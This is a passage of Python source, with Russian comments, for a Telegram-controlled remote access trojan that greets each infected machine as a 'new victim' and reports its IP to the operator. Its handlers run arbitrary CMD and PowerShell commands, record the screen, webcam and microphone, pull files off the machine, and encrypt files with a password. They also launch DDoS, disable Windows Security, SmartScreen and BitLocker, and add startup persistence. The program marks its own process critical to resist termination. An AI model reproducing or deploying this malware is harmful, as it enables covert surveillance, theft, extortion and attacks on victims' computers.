        context.user_data['set_dns_mode'] = True
        context.bot.send_message(chat_id, "🌐 Enter primary DNS (optional secondary):")
    
    elif data == "reset_dns":
        context.bot.send_message(chat_id, reset_dns())
    
    elif data == "network_adapters":
        context.bot.send_message(chat_id, f"🌐 Adapters on `{pc_name}`:\n{get_network_adapters()}", parse_mode="Markdown")
    
    elif data == "enable_adapter":
        context.user_data['enable_adapter_mode'] = True
        context.bot.send_message(chat_id, f"🌐 Enter adapter name on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "disable_adapter":
        context.user_data['disable_adapter_mode'] = True
        context.bot.send_message(chat_id, f"🌐 Enter adapter name on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "arp_table":
        context.bot.send_message(chat_id, f"🌐 ARP Table on `{pc_name}`:\n{get_arp_table()}", parse_mode="Markdown")
    
    elif data == "disable_windows_security":
        context.bot.send_message(chat_id, f"🔑 Security on `{pc_name}`:\n{disable_windows_security()}", parse_mode="Markdown")
    
    elif data == "disable_smart_screen":
        context.bot.send_message(chat_id, f"🔑 SmartScreen on `{pc_name}`:\n{disable_smart_screen()}", parse_mode="Markdown")
    
    elif data == "disable_bitlocker":
        context.bot.send_message(chat_id, f"🔑 BitLocker on `{pc_name}`:\n{disable_bitlocker()}", parse_mode="Markdown")
    
    elif data == "installed_software":
        context.bot.send_message(chat_id, f"📦 Software on `{pc_name}`:\n{get_installed_software()}", parse_mode="Markdown")
    
    elif data == "running_services":
        context.bot.send_message(chat_id, f"🔄 Services on `{pc_name}`:\n{get_running_services()}", parse_mode="Markdown")
    
    elif data == "stop_service":
        context.user_data['stop_service_mode'] = True
        context.bot.send_message(chat_id, f"🔑 Enter service name on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "start_service":
        context.user_data['start_service_mode'] = True
        context.bot.send_message(chat_id, f"🔑 Enter service name on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "disable_service":
        context.user_data['disable_service_mode'] = True
        context.bot.send_message(chat_id, f"🔑 Enter service name on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "enable_service":
        context.user_data['enable_service_mode'] = True
        context.bot.send_message(chat_id, f"🔑 Enter service name on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "startup_programs":
        context.bot.send_message(chat_id, f"🚀 Startup on `{pc_name}`:\n{get_startup_programs()}", parse_mode="Markdown")
    
    elif data == "disable_startup":
        context.user_data['disable_startup_mode'] = True
        context.bot.send_message(chat_id, f"🔑 Enter startup name on `{pc_name}`:", parse_mode="Markdown")
    
    elif data == "enable_startup":
        context.user_data['enable_startup_mode'] = True
        context.bot.send_message(chat_id, f"🔑 Enter name|path on `{pc_name}`:", parse_mode="Markdown")

# ============ ОБРАБОТКА СООБЩЕНИЙ ============
def handle_message(update, context):
    global selected_pc
    chat_id = update.message.chat.id
    text = update.message.text

    # Игнорируем всех, кроме админа
    if chat_id != ADMIN_ID:
        return

    # Команда /list
    if text == "/list":
        if not known_pcs:
            context.bot.send_message(chat_id, "❌ Нет сохранённых ПК")
            return
        
        keyboard = []
        for pc in known_pcs:
            keyboard.append([InlineKeyboardButton(f"🖥️ {pc}", callback_data=f"select_pc|{pc}")])
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back")])
        
        context.bot.send_message(
            chat_id,
            "📋 *Выбери ПК:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        return

    # Если ПК не выбран
    if not selected_pc:
        context.bot.send_message(chat_id, "❌ Сначала выбери ПК через /list")
        return

    # Если выбранный ПК — это текущий, выполняем команду
    if selected_pc != PC_ID:
        context.bot.send_message(chat_id, f"⚠️ Команда для ПК `{selected_pc}` будет выполнена позже", parse_mode="Markdown")
        return

    # Обработка команд с вводом
    pc_name = selected_pc if selected_pc else PC_ID
    
    if context.user_data.get('cmd_mode'):
        context.user_data['cmd_mode'] = False
        context.bot.send_message(chat_id, f"📟 CMD on `{pc_name}`:\n{execute_cmd(text)[:4000]}", parse_mode="Markdown")
    
    elif context.user_data.get('ps_mode'):
        context.user_data['ps_mode'] = False
        context.bot.send_message(chat_id, f"⚡ PowerShell on `{pc_name}`:\n{execute_powershell(text)[:4000]}", parse_mode="Markdown")
    
    elif context.user_data.get('kill_mode'):
        context.user_data['kill_mode'] = False
        context.bot.send_message(chat_id, f"💀 Process on `{pc_name}`:\n{kill_process(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('startproc_mode'):
        context.user_data['startproc_mode'] = False
        context.bot.send_message(chat_id, f"🚀 Process on `{pc_name}`:\n{start_process(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('ddos_mode'):
        context.user_data['ddos_mode'] = False
        context.bot.send_message(chat_id, start_ddos(text))
    
    elif context.user_data.get('screenrecord_mode'):
        context.user_data['screenrecord_mode'] = False
        try:
            duration = int(text)
            if 1 <= duration <= 60:
                filename = record_screen(duration)
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        context.bot.send_video(chat_id, video=BytesIO(f.read()), filename=filename, caption=f"🎥 Screen recording from `{pc_name}`", parse_mode="Markdown")
                    os.remove(filename)
            else:
                context.bot.send_message(chat_id, "❌ 1-60 sec only")
        except:
            context.bot.send_message(chat_id, "❌ Invalid")
    
    elif context.user_data.get('webcam_mode'):
        context.user_data['webcam_mode'] = False
        try:
            duration = int(text)
            if 1 <= duration <= 60:
                filename = record_webcam(duration)
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        context.bot.send_video(chat_id, video=BytesIO(f.read()), filename=filename, caption=f"📷 Webcam from `{pc_name}`", parse_mode="Markdown")
                    os.remove(filename)
            else:
                context.bot.send_message(chat_id, "❌ 1-60 sec only")
        except:
            context.bot.send_message(chat_id, "❌ Invalid")
    
    elif context.user_data.get('scream_mode'):
        context.user_data['scream_mode'] = False
        context.bot.send_message(chat_id, f"🎬 Video on `{pc_name}`:\n{scream_make(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('upload_mode'):
        context.user_data['upload_mode'] = False
        context.bot.send_message(chat_id, "📤 Send the file as a document:")
        context.user_data['awaiting_upload'] = True
    
    elif context.user_data.get('downloadfile_mode'):
        context.user_data['downloadfile_mode'] = False
        result = download_file_from_pc(text)
        if result:
            with open(result, 'rb') as f:
                context.bot.send_document(chat_id, document=BytesIO(f.read()), filename=os.path.basename(result), caption=f"📥 File from `{pc_name}`", parse_mode="Markdown")
        else:
            context.bot.send_message(chat_id, "❌ File not found")
    
    elif context.user_data.get('encrypt_mode'):
        context.user_data['encrypt_mode'] = False
        context.user_data['encrypt_pass_mode'] = True
        context.user_data['encrypt_path'] = text
        context.bot.send_message(chat_id, f"🔒 Enter password for `{pc_name}`:", parse_mode="Markdown")
    
    elif context.user_data.get('encrypt_pass_mode'):
        context.user_data['encrypt_pass_mode'] = False
        context.bot.send_message(chat_id, f"🔒 Encryption on `{pc_name}`:\n{encrypt_files(context.user_data['encrypt_path'], text)}", parse_mode="Markdown")
    
    elif context.user_data.get('decrypt_mode'):
        context.user_data['decrypt_mode'] = False
        context.user_data['decrypt_pass_mode'] = True
        context.user_data['decrypt_path'] = text
        context.bot.send_message(chat_id, f"🔓 Enter password for `{pc_name}`:", parse_mode="Markdown")
    
    elif context.user_data.get('decrypt_pass_mode'):
        context.user_data['decrypt_pass_mode'] = False
        context.bot.send_message(chat_id, f"🔓 Decryption on `{pc_name}`:\n{decrypt_files(context.user_data['decrypt_path'], text)}", parse_mode="Markdown")
    
    elif context.user_data.get('audio_mode'):
        context.user_data['audio_mode'] = False
        try:
            duration = int(text)
            if 1 <= duration <= 60:
                filename = record_audio(duration)
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        context.bot.send_audio(chat_id, audio=BytesIO(f.read()), filename=filename, caption=f"🎤 Audio from `{pc_name}`", parse_mode="Markdown")
                    os.remove(filename)
            else:
                context.bot.send_message(chat_id, "❌ 1-60 sec only")
        except:
            context.bot.send_message(chat_id, "❌ Invalid")
    
    elif context.user_data.get('msgbox_mode'):
        context.user_data['msgbox_mode'] = False
        context.bot.send_message(chat_id, f"💬 MessageBox on `{pc_name}`:\n{show_messagebox(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('download_mode'):
        context.user_data['download_mode'] = False
        context.bot.send_message(chat_id, download_file(text))
    
    elif context.user_data.get('listfiles_mode'):
        context.user_data['listfiles_mode'] = False
        context.bot.send_message(chat_id, f"📂 Files on `{pc_name}`:\n{list_files(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('copy_file_mode'):
        context.user_data['copy_file_mode'] = False
        src, dst = text.split('|')
        context.bot.send_message(chat_id, f"📁 Copy on `{pc_name}`:\n{copy_file(src, dst)}", parse_mode="Markdown")
    
    elif context.user_data.get('move_file_mode'):
        context.user_data['move_file_mode'] = False
        src, dst = text.split('|')
        context.bot.send_message(chat_id, f"📁 Move on `{pc_name}`:\n{move_file(src, dst)}", parse_mode="Markdown")
    
    elif context.user_data.get('delete_file_mode'):
        context.user_data['delete_file_mode'] = False
        context.bot.send_message(chat_id, f"📁 Delete on `{pc_name}`:\n{delete_file(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('rename_file_mode'):
        context.user_data['rename_file_mode'] = False
        old, new = text.split('|')
        context.bot.send_message(chat_id, f"📁 Rename on `{pc_name}`:\n{rename_file(old, new)}", parse_mode="Markdown")
    
    elif context.user_data.get('create_folder_mode'):
        context.user_data['create_folder_mode'] = False
        context.bot.send_message(chat_id, f"📁 Create folder on `{pc_name}`:\n{create_folder(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('delete_folder_mode'):
        context.user_data['delete_folder_mode'] = False
        context.bot.send_message(chat_id, f"📁 Delete folder on `{pc_name}`:\n{delete_folder(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('hide_file_mode'):
        context.user_data['hide_file_mode'] = False
        context.bot.send_message(chat_id, f"📁 Hide on `{pc_name}`:\n{hide_file(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('unhide_file_mode'):
        context.user_data['unhide_file_mode'] = False
        context.bot.send_message(chat_id, f"📁 Unhide on `{pc_name}`:\n{unhide_file(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('make_readonly_mode'):
        context.user_data['make_readonly_mode'] = False
        context.bot.send_message(chat_id, f"📁 Read-only on `{pc_name}`:\n{make_readonly(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('make_writable_mode'):
        context.user_data['make_writable_mode'] = False
        context.bot.send_message(chat_id, f"📁 Writable on `{pc_name}`:\n{make_writable(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('file_hash_mode'):
        context.user_data['file_hash_mode'] = False
        context.bot.send_message(chat_id, f"📁 Hash on `{pc_name}`:\n{get_file_hash(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('search_files_mode'):
        context.user_data['search_files_mode'] = False
        path, name = text.split('|')
        context.bot.send_message(chat_id, f"📁 Search on `{pc_name}`:\n{search_files(path, name)}", parse_mode="Markdown")
    
    elif context.user_data.get('search_by_extension_mode'):
        context.user_data['search_by_extension_mode'] = False
        path, ext = text.split('|')
        context.bot.send_message(chat_id, f"📁 Search by .ext on `{pc_name}`:\n{search_by_extension(path, ext)}", parse_mode="Markdown")
    
    elif context.user_data.get('file_metadata_mode'):
        context.user_data['file_metadata_mode'] = False
        context.bot.send_message(chat_id, f"📁 Metadata on `{pc_name}`:\n{get_file_metadata(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('file_permissions_mode'):
        context.user_data['file_permissions_mode'] = False
        context.bot.send_message(chat_id, f"📁 Permissions on `{pc_name}`:\n{get_file_permissions(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('scan_ports_mode'):
        context.user_data['scan_ports_mode'] = False
        host, ports = text.split('|')
        context.bot.send_message(chat_id, f"🌐 Scan on `{pc_name}`:\n{scan_ports(host, ports)}", parse_mode="Markdown")
    
    elif context.user_data.get('ping_host_mode'):
        context.user_data['ping_host_mode'] = False
        context.bot.send_message(chat_id, f"🌐 Ping on `{pc_name}`:\n{ping_host(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('traceroute_mode'):
        context.user_data['traceroute_mode'] = False
        context.bot.send_message(chat_id, f"🌐 Traceroute on `{pc_name}`:\n{traceroute(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('enable_proxy_mode'):
        context.user_data['enable_proxy_mode'] = False
        ip, port = text.split('|')
        context.bot.send_message(chat_id, f"🌐 Proxy on `{pc_name}`:\n{enable_proxy(ip, port)}", parse_mode="Markdown")
    
    elif context.user_data.get('set_dns_mode'):
        context.user_data['set_dns_mode'] = False
        parts = text.split('|')
        if len(parts) > 1:
            context.bot.send_message(chat_id, f"🌐 DNS on `{pc_name}`:\n{set_dns(parts[0], parts[1])}", parse_mode="Markdown")
        else:
            context.bot.send_message(chat_id, f"🌐 DNS on `{pc_name}`:\n{set_dns(parts[0])}", parse_mode="Markdown")
    
    elif context.user_data.get('enable_adapter_mode'):
        context.user_data['enable_adapter_mode'] = False
        context.bot.send_message(chat_id, f"🌐 Adapter on `{pc_name}`:\n{enable_adapter(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('disable_adapter_mode'):
        context.user_data['disable_adapter_mode'] = False
        context.bot.send_message(chat_id, f"🌐 Adapter on `{pc_name}`:\n{disable_adapter(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('stop_service_mode'):
        context.user_data['stop_service_mode'] = False
        context.bot.send_message(chat_id, f"🔑 Service on `{pc_name}`:\n{stop_service(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('start_service_mode'):
        context.user_data['start_service_mode'] = False
        context.bot.send_message(chat_id, f"🔑 Service on `{pc_name}`:\n{start_service(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('disable_service_mode'):
        context.user_data['disable_service_mode'] = False
        context.bot.send_message(chat_id, f"🔑 Service on `{pc_name}`:\n{disable_service(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('enable_service_mode'):
        context.user_data['enable_service_mode'] = False
        context.bot.send_message(chat_id, f"🔑 Service on `{pc_name}`:\n{enable_service(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('disable_startup_mode'):
        context.user_data['disable_startup_mode'] = False
        context.bot.send_message(chat_id, f"🔑 Startup on `{pc_name}`:\n{disable_startup_program(text)}", parse_mode="Markdown")
    
    elif context.user_data.get('enable_startup_mode'):
        context.user_data['enable_startup_mode'] = False
        name, path = text.split('|')
        context.bot.send_message(chat_id, f"🔑 Startup on `{pc_name}`:\n{enable_startup_program(name, path)}", parse_mode="Markdown")
    
    elif context.user_data.get('open_url_mode'):
        context.user_data['open_url_mode'] = False
        context.bot.send_message(chat_id, open_url(text))
    
    elif context.user_data.get('type_text_mode'):
        context.user_data['type_text_mode'] = False
        context.bot.send_message(chat_id, type_text(text))
    
    elif context.user_data.get('notification_mode'):
        context.user_data['notification_mode'] = False
        context.bot.send_message(chat_id, show_notification(text))
    
    elif context.user_data.get('set_time_mode'):
        context.user_data['set_time_mode'] = False
        context.bot.send_message(chat_id, set_time(text))
    
    elif context.user_data.get('set_date_mode'):
        context.user_data['set_date_mode'] = False
        context.bot.send_message(chat_id, set_date(text))
    
    elif context.user_data.get('speak_mode'):
        context.user_data['speak_mode'] = False
        context.bot.send_message(chat_id, speak_text(text))

def handle_document(update, context):
    chat_id = update.message.chat.id
    doc = update.message.document

    if context.user_data.get('awaiting_audio'):
        context.user_data['awaiting_audio'] = False
        play_audio_from_document(update, context)
        return

    if context.user_data.get('awaiting_upload'):
        context.user_data['awaiting_upload'] = False
        file = context.bot.get_file(doc.file_id)
        file_data = file.download_as_bytearray()
        context.bot.send_message(chat_id, upload_file_to_pc(file_data, doc.file_name))
        return

    elif context.user_data.get('awaiting_wallpaper'):
        context.user_data['awaiting_wallpaper'] = False
        set_wallpaper_from_document(update, context)
        return

    if doc.mime_type and doc.mime_type.startswith('image/'):
        set_wallpaper_from_document(update, context)
        return
    else:
        context.bot.send_message(chat_id, "📄 Файл получен. Используй Upload File для загрузки.")

# ============ ПРИВЕТСТВИЕ НОВОЙ ЖЕРТВЫ ============
if PC_ID not in known_pcs:
    known_pcs.append(PC_ID)
    try:
        # Отправляем красивое уведомление о новой жертве
        message = (
            f"🟢 *НОВАЯ ЖЕРТВА ПОДКЛЮЧИЛАСЬ!*\n\n"
            f"🖥️ *PC:* `{PC_ID}`\n"
            f"🌐 *IP:* {requests.get('https://api.ipify.org', timeout=5).text}\n"
            f"🕐 *Время:* {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n\n"
            f"📋 *Используй команду /list для выбора ПК*"
        )
        bot.send_message(ADMIN_ID, message, parse_mode="Markdown")
    except:
        pass

# ============ РЕГИСТРАЦИЯ ОБРАБОТЧИКОВ ============
dp.add_handler(CommandHandler("start", start))
dp.add_handler(CallbackQueryHandler(callback))
dp.add_handler(MessageHandler(Filters.document, handle_document))
dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

try:
    ctypes.windll.ntdll.RtlSetProcessIsCritical(True, False, False)
except:
    pass

updater.start_polling()
updater.idle()